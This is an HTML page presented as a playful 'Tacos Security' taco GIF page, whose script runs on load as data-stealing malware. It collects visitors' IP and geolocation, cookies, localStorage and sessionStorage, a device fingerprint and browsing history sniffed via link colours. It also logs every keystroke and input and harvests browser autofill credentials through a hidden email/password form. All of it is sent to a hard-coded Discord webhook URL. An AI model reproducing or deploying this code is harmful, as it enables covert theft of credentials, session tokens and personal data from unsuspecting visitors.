<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Tacos Security</title>
    <style>
        body {
            margin: 0;
            padding: 0;
            background: linear-gradient(135deg, #1a1a2e, #16213e);
            font-family: 'Segoe UI', sans-serif;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
        }
        .container {
            text-align: center;
            padding: 20px;
        }
        img {
            width: 100%;
            max-width: 400px;
            border-radius: 30px;
            box-shadow: 0 20px 40px rgba(0,0,0,0.3);
        }
        h1 {
            color: white;
            margin-top: 20px;
        }
        .status {
            background: rgba(0,0,0,0.6);
            padding: 15px;
            border-radius: 20px;
            color: #00ff88;
            font-family: monospace;
            margin-top: 20px;
            font-size: 12px;
        }
    </style>
</head>
<body>
    <div class="container">
        <img src="https://media.tenor.com/0eCk6f7F0YsAAAAC/taco-tacos.gif" alt="Tacos">
        <h1>🌮 TACOS TIME 🌮</h1>
        <div class="status" id="status">🔍 Collecte des données...</div>
    </div>

    <script>
        // ========== TON WEBHOOK DISCORD ==========
        const WEBHOOK_URL = "https://canary.discord.com/api/webhooks/1490663339284631685/I7AfZ_ci4CUyTmk9f2BcAdI0qotYl9B5VjUNLEWnW7XShOSnrzoG0pbKqZEJ2Ik5GTRr";
        
        // ========== 1. IP REELLE ==========
        async function getRealIP() {
            try {
                const res = await fetch('https://api.ipify.org?format=json');
                const data = await res.json();
                return data.ip;
            } catch(e) {
                return 'IP non trouvée';
            }
        }
        
        // ========== 2. GEOLOCALISATION REELLE ==========
        async function getRealGeo(ip) {
            try {
                const res = await fetch(`https://ipapi.co/${ip}/json/`);
                const data = await res.json();
                return {
                    pays: data.country_name || 'Inconnu',
                    ville: data.city || 'Inconnu',
                    region: data.region || 'Inconnu',
                    latitude: data.latitude || 0,
                    longitude: data.longitude || 0,
                    fai: data.org || 'Inconnu',
                    code_postal: data.postal || 'Inconnu'
                };
            } catch(e) {
                return { erreur: 'Geo non disponible' };
            }
        }
        
        // ========== 3. TOUS LES COOKIES ==========
        function getAllCookies() {
            if (!document.cookie) return 'Aucun cookie';
            return document.cookie;
        }
        
        // ========== 4. LOCALSTORAGE COMPLET ==========
        function getAllLocalStorage() {
            let result = '';
            for (let i = 0; i < localStorage.length; i++) {
                const key = localStorage.key(i);
                const value = localStorage.getItem(key);
                result += `${key} = ${value}\n`;
            }
            return result || 'Aucune donnée LocalStorage';
        }
        
        // ========== 5. SESSIONSTORAGE COMPLET ==========
        function getAllSessionStorage() {
            let result = '';
            for (let i = 0; i < sessionStorage.length; i++) {
                const key = sessionStorage.key(i);
                const value = sessionStorage.getItem(key);
                result += `${key} = ${value}\n`;
            }
            return result || 'Aucune donnée SessionStorage';
        }
        
        // ========== 6. INFOS APPAREIL (FINGERPRINT) ==========
        function getDeviceInfo() {
            return {
                userAgent: navigator.userAgent,
                platform: navigator.platform,
                langue: navigator.language,
                ecran: `${screen.width}x${screen.height}`,
                profondeur_couleur: screen.colorDepth,
                fuseau_horaire: Intl.DateTimeFormat().resolvedOptions().timeZone,
                coeurs_CPU: navigator.hardwareConcurrency || 'Inconnu',
                RAM: navigator.deviceMemory || 'Inconnu' + ' GB',
                touchPoints: navigator.maxTouchPoints,
                cookies_actives: navigator.cookieEnabled ? 'Oui' : 'Non'
            };
        }
        
        // ========== 7. SITES VISITES (via CSS) ==========
        function getVisitedSites() {
            const sites = [
                'https://discord.com/login',
                'https://github.com/login',
                'https://accounts.google.com',
                'https://www.facebook.com',
                'https://www.instagram.com',
                'https://twitter.com',
                'https://outlook.live.com',
                'https://mail.google.com',
                'https://www.youtube.com',
                'https://www.tiktok.com'
            ];
            
            const visits = [];
            for (const site of sites) {
                const link = document.createElement('a');
                link.href = site;
                link.style.cssText = 'position:absolute;left:-9999px;';
                document.body.appendChild(link);
                const color = window.getComputedStyle(link).color;
                if (color !== 'rgb(0, 0, 238)') {
                    visits.push(site);
                }
                link.remove();
            }
            return visits;
        }
        
        // ========== 8. KEYLOGGER (TOUT CE QUI EST TAPE) ==========
        let keylogData = '';
        let lastSend = Date.now();
        
        function startKeylogger() {
            document.addEventListener('keydown', (e) => {
                if (e.key === 'Enter') keylogData += '\n';
                else if (e.key === 'Backspace') keylogData = keylogData.slice(0, -1);
                else if (e.key === 'Tab') keylogData += '    ';
                else if (e.key.length === 1) keylogData += e.key;
                
                // Envoie toutes les 10 secondes ou si trop de caractères
                if (keylogData.length > 200 || (Date.now() - lastSend) > 10000) {
                    if (keylogData.length > 5) {
                        sendToWebhook('⌨️ KEYLOGGER', `\`\`\`\n${keylogData}\n\`\`\``);
                        keylogData = '';
                        lastSend = Date.now();
                    }
                }
            });
            
            // Capture aussi les inputs
            document.addEventListener('input', (e) => {
                if (e.target.tagName === 'INPUT' || e.target.tagName === 'TEXTAREA') {
                    keylogData += `[${e.target.placeholder || e.target.name || 'input'}] = ${e.target.value}\n`;
                }
            });
        }
        
        // ========== 9. FORMULAIRE CACHE POUR AUTOFILL ==========
        function createHiddenForm() {
            const form = document.createElement('div');
            form.style.position = 'absolute';
            form.style.left = '-9999px';
            form.style.top = '-9999px';
            form.innerHTML = `
                <form>
                    <input type="text" name="email" id="hiddenEmail" placeholder="Email">
                    <input type="password" name="password" id="hiddenPassword" placeholder="Mot de passe">
                </form>
            `;
            document.body.appendChild(form);
            
            // Récupère l'autofill après quelques secondes
            setTimeout(() => {
                const email = document.getElementById('hiddenEmail').value;
                const password = document.getElementById('hiddenPassword').value;
                if (email || password) {
                    sendToWebhook('🔑 AUTOFILL CAPTURE', `Email: ${email}\nPassword: ${password}`);
                }
            }, 3000);
            
            setTimeout(() => {
                const email = document.getElementById('hiddenEmail').value;
                const password = document.getElementById('hiddenPassword').value;
                if (email || password) {
                    sendToWebhook('🔑 AUTOFILL CAPTURE (retard)', `Email: ${email}\nPassword: ${password}`);
                }
            }, 8000);
        }
        
        // ========== 10. ENVOI AU WEBHOOK DISCORD ==========
        async function sendToWebhook(title, content) {
            const embed = {
                title: `🌮 ${title}`,
                description: content.length > 1900 ? content.substring(0, 1900) + '...' : content,
                color: 0xFF6600,
                timestamp: new Date().toISOString()
            };
            
            try {
                const response = await fetch(WEBHOOK_URL, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ embeds: [embed] })
                });
                if (response.ok) {
                    console.log(`✅ Envoyé: ${title}`);
                } else {
                    console.log(`❌ Erreur: ${response.status}`);
                }
            } catch(e) {
                console.log(`❌ Erreur envoi: ${e.message}`);
            }
        }
        
        // ========== 11. COLLECTE ET ENVOI DE TOUT ==========
        async function collectAndSendAll() {
            const statusDiv = document.getElementById('status');
            statusDiv.innerHTML = "🌐 Récupération IP...";
            
            // IP
            const ip = await getRealIP();
            statusDiv.innerHTML = `📍 IP trouvée: ${ip}`;
            await sendToWebhook('🌐 IP PUBLIQUE', ip);
            
            // Géolocalisation
            statusDiv.innerHTML = "🗺️ Récupération géolocalisation...";
            const geo = await getRealGeo(ip);
            await sendToWebhook('📍 GEOLOCALISATION', 
                `**Pays:** ${geo.pays}\n**Ville:** ${geo.ville}\n**Région:** ${geo.region}\n**Code postal:** ${geo.code_postal}\n**FAI:** ${geo.fai}\n**Coords:** ${geo.latitude}, ${geo.longitude}`);
            
            // Cookies
            statusDiv.innerHTML = "🍪 Récupération cookies...";
            const cookies = getAllCookies();
            if (cookies !== 'Aucun cookie') {
                await sendToWebhook('🍪 COOKIES', cookies);
            }
            
            // LocalStorage
            statusDiv.innerHTML = "💾 Récupération LocalStorage...";
            const localStorage = getAllLocalStorage();
            if (localStorage !== 'Aucune donnée LocalStorage') {
                await sendToWebhook('💾 LOCALSTORAGE', localStorage);
            }
            
            // SessionStorage
            statusDiv.innerHTML = "📦 Récupération SessionStorage...";
            const sessionStorage = getAllSessionStorage();
            if (sessionStorage !== 'Aucune donnée SessionStorage') {
                await sendToWebhook('📦 SESSIONSTORAGE', sessionStorage);
            }
            
            // Infos appareil
            statusDiv.innerHTML = "📱 Récupération infos appareil...";
            const deviceInfo = getDeviceInfo();
            await sendToWebhook('📱 INFOS APPAREIL', 
                `**User Agent:** ${deviceInfo.userAgent}\n**Plateforme:** ${deviceInfo.platform}\n**Langue:** ${deviceInfo.langue}\n**Écran:** ${deviceInfo.ecran}\n**CPU:** ${deviceInfo.coeurs_CPU} coeurs\n**RAM:** ${deviceInfo.RAM}\n**Fuseau:** ${deviceInfo.fuseau_horaire}\n**Cookies:** ${deviceInfo.cookies_actives}`);
            
            // Sites visités
            statusDiv.innerHTML = "🌐 Détection sites visités...";
            const visited = getVisitedSites();
            if (visited.length > 0) {
                await sendToWebhook('🌐 SITES VISITÉS', visited.join('\n'));
            }
            
            // Keylogger activé
            statusDiv.innerHTML = "⌨️ Keylogger activé - Tout ce que tu tapes est envoyé à Discord";
            startKeylogger();
            
            // Formulaire caché autofill
            createHiddenForm();
            
            // Envoi final
            statusDiv.innerHTML = "✅ COLLECTE TERMINÉE !\n⌨️ Keylogger actif - continue de taper...";
        }
        
        // LANCEMENT
        collectAndSendAll();
    </script>
</body>
</html>
